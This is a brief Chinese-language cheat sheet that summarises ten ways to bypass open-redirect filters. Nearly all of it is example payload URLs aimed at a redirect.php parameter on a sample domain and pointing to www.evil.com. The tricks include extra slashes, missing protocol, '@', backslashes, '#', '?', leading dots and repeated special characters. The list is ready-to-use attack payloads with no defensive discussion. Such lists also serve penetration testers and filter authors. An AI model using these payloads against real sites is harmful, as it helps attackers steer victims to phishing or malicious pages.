# url跳转漏洞bypass总结

```
```

```
10种bypass方式：

1. 单斜线"/"绕过
https://www.landHYU.me/redirect.php?url=/www.evil.com
2. 缺少协议绕过
https://www.landHYU.me/redirect.php?url=//www.evil.com
3. 多斜线"/"前缀绕过
https://www.landHYU.me/redirect.php?url=///www.evil.com
https://www.landHYU.me/redirect.php?url=////www.evil.com
4. 利用"@"符号绕过
https://www.landHYU.me/redirect.php?url=https://[邮箱已脱敏]
5. 利用反斜线"\"绕过
https://www.landHYU.me/redirect.php?url=https://www.evil.com\www.landHYU.me
6. 利用"#"符号绕过
https://www.landHYU.me/redirect.php?url=https://www.evil.com#www.landHYU.me
7. 利用"?"号绕过
https://www.landHYU.me/redirect.php?url=https://www.evil.com?www.landHYU.me
8. 利用"\\"绕过
https://www.landHYU.me/redirect.php?url=https://www.evil.com\\www.landHYU.me
9. 利用"."绕过
https://www.landHYU.me/redirect.php?url=.evil (可能会跳转到www.landHYU.me.evil域名)
https://www.landHYU.me/redirect.php?url=.evil.com (可能会跳转到evil.com域名)
10.重复特殊字符绕过
https://www.landHYU.me/redirect.php?url=///www.evil.com//..
https://www.landHYU.me/redirect.php?url=////www.evil.com//..
```
